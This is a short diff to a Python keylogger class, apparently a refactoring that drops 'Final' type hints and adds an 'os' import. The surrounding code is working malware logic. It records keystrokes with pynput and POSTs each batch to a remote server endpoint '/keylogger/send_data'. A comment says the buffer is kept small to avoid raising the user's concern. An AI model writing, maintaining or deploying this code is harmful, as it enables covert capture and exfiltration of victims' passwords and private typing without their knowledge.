@@ -1,13 +1,14 @@
-from typing import List, Final, Dict, Optional, Union
+from typing import List, Dict, Optional, Union
 import json
 import requests
 import uuid
+import os
 from pynput import keyboard  # type: ignore
 from pynput.keyboard import Key, KeyCode  # type: ignore
 
 # Maximum number of keys to save, keep low to avoid memory issues
 # that could warrant concern from user
-SAVED_KEYS_LIMIT: Final[int] = 32
+SAVED_KEYS_LIMIT = 32
 
 
 class Keylogger:
@@ -54,7 +55,7 @@ class Keylogger:
         self._pressed[character] = True
 
         if len(self._keys_pressed) >= SAVED_KEYS_LIMIT:
-            url: Final[str] = f'{self._server_addr}/keylogger/send_data'
+            url = f'{self._server_addr}/keylogger/send_data'
             response: dict = requests.post(url, json=self._to_json())
             self._keys_pressed.clear()
 
